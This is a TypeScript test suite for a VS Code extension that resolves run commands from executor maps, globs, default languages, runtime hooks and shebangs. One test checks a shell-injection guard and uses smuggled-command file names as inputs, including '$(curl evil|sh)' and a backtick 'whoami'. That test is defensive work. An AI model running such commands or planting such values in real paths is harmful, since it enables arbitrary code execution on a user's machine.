import * as assert from 'node:assert';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import * as vscode from 'vscode';
import { resolveCommand } from '../run/runner';
import {
  prepareRunCommand,
  resolveDefaultLanguageSelection,
  resolveRuntimeSelection,
} from '../runners/runtimeSupport';
import type { RunContext } from '../runners/types';
import { pathHasInjectionRisk } from '../util/trust';

function ctxFor(filePath: string): RunContext {
  const fileBasename = path.basename(filePath);
  return {
    filePath,
    fileBasename,
    fileBasenameNoExt: fileBasename.replace(/\.[^.]+$/, ''),
    fileDirname: path.dirname(filePath),
    workspaceFolder: path.dirname(filePath),
    relativeFile: fileBasename,
  };
}

/** Resolve exactly as runUri does: one selection, fed to resolveCommand. */
function resolve(
  ctx: RunContext,
  languageId?: string,
  runtime?: string,
): string | undefined {
  const selection = resolveRuntimeSelection(ctx.filePath, languageId, runtime);
  return resolveCommand(ctx, selection, languageId, runtime)?.command;
}

describe('resolveCommand', () => {
  const cfg = () => vscode.workspace.getConfiguration('rundebug');
  const touched: string[] = [];

  async function set(key: string, value: unknown): Promise<void> {
    touched.push(key);
    await cfg().update(key, value, vscode.ConfigurationTarget.Global);
  }

  afterEach(async () => {
    while (touched.length) {
      const key = touched.pop()!;
      await cfg().update(key, undefined, vscode.ConfigurationTarget.Global);
    }
  });

  it('falls back to the registry default runner', () => {
    assert.strictEqual(resolve(ctxFor('/p/app.py')), 'python3 -u "/p/app.py"');
  });

  it('honours an explicit runtime override over all config', async () => {
    await set('executorMap', { typescript: 'should-not-win {file}' });
    assert.ok(resolve(ctxFor('/p/a.ts'), 'typescript', 'bun')?.startsWith('bun '));
  });

  it('applies executorMap by runner id', async () => {
    await set('executorMap', { python: 'mypy-run {file}' });
    assert.strictEqual(resolve(ctxFor('/p/a.py')), 'mypy-run /p/a.py');
  });

  it('applies executorMapByFileExtension for files with no runner', async () => {
    await set('executorMapByFileExtension', { '.xyz': 'xyz {fileBasename}' });
    assert.strictEqual(resolve(ctxFor('/p/thing.xyz')), 'xyz thing.xyz');
  });

  it('applies executorMapByGlob by filename', async () => {
    await set('executorMapByGlob', { 'Makefile': 'make -C {fileDirname}' });
    assert.strictEqual(resolve(ctxFor('/p/Makefile')), 'make -C /p');
  });

  it('matches executorMapByGlob against the relative path too (#1255)', async () => {
    await set('executorMapByGlob', { '**/*.spec.ts': 'vitest run {file}' });
    const ctx: RunContext = {
      filePath: '/p/src/util/a.spec.ts',
      fileBasename: 'a.spec.ts',
      fileBasenameNoExt: 'a.spec',
      fileDirname: '/p/src/util',
      workspaceFolder: '/p',
      relativeFile: 'src/util/a.spec.ts',
    };
    assert.strictEqual(resolve(ctx), 'vitest run /p/src/util/a.spec.ts');
  });

  it('flags paths that could break out of shell quoting (untrusted guard)', () => {
    assert.strictEqual(pathHasInjectionRisk('/p/app.js'), false);
    assert.strictEqual(pathHasInjectionRisk('/p/My Project (x86)/a.py'), false);
    assert.strictEqual(pathHasInjectionRisk('/p/$(curl evil|sh).js'), true);
    assert.strictEqual(pathHasInjectionRisk('/p/`whoami`.rb'), true);
    assert.strictEqual(pathHasInjectionRisk('/p/a".js'), true);
  });

  it('uses defaultLanguage when nothing else matches', async () => {
    assert.strictEqual(resolve(ctxFor('/p/mystery.unknownext')), undefined);
    await set('defaultLanguage', 'python');
    assert.strictEqual(
      resolve(ctxFor('/p/mystery.unknownext')),
      'python3 -u "/p/mystery.unknownext"',
    );
  });

  it('applies the fallback language runtime prep hooks (type stripping)', async () => {
    await set('defaultLanguage', 'typescript');
    await set('runtime.typescript', 'node');
    const ctx = ctxFor('/p/mystery.unknownext');
    const selection = resolveRuntimeSelection(ctx.filePath);
    const resolved = resolveCommand(ctx, selection);
    assert.ok(resolved, 'a fallback command resolves');
    // The selection must be the typescript:node fallback, not the empty file
    // selection — otherwise the type-stripping flag is never injected.
    assert.ok(resolved!.selection, 'fallback variant carries a prep selection');
    const prep = { command: resolved!.command, cwd: '/p' };
    await prepareRunCommand(resolved!.selection!, ctx, prep);
    assert.ok(
      prep.command.includes('--experimental-'),
      `expected a type-stripping flag, got: ${prep.command}`,
    );
  });

  it('does not let runtime prep rewrite an executorMap override', async () => {
    await set('executorMap', { typescript: 'node {file}' });
    await set('runtime.typescript', 'node');
    const ctx = ctxFor('/p/a.ts');
    const selection = resolveRuntimeSelection(ctx.filePath, 'typescript');
    const resolved = resolveCommand(ctx, selection, 'typescript');
    assert.strictEqual(resolved?.command, 'node /p/a.ts');
    // Override wins verbatim: no selection, so prepareRunCommand never injects
    // the type-stripping flag.
    assert.strictEqual(resolved?.selection, undefined);
    const prep = { command: resolved!.command, cwd: '/p' };
    if (resolved?.selection) {
      await prepareRunCommand(resolved.selection, ctx, prep);
    }
    assert.strictEqual(prep.command, 'node /p/a.ts');
  });

  it('exposes a debuggable variant for the fallback language (debug parity)', async () => {
    await set('defaultLanguage', 'python');
    const fallback = resolveDefaultLanguageSelection('/p/mystery.unknownext');
    assert.ok(fallback?.selection.variant?.debug, 'debug parity for defaultLanguage');
  });

  it('respects a shebang line, but ignores Rust inner attributes', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'rundebug-'));
    const sh = path.join(dir, 'script');
    fs.writeFileSync(sh, '#!/bin/sh\necho hi\n');
    assert.strictEqual(resolve(ctxFor(sh)), `/bin/sh "${sh}"`);

    const rs = path.join(dir, 'main.rs');
    fs.writeFileSync(rs, '#![allow(dead_code)]\nfn main() {}\n');
    assert.ok(resolve(ctxFor(rs))?.includes('rustc'), 'rust still compiles');
  });
});
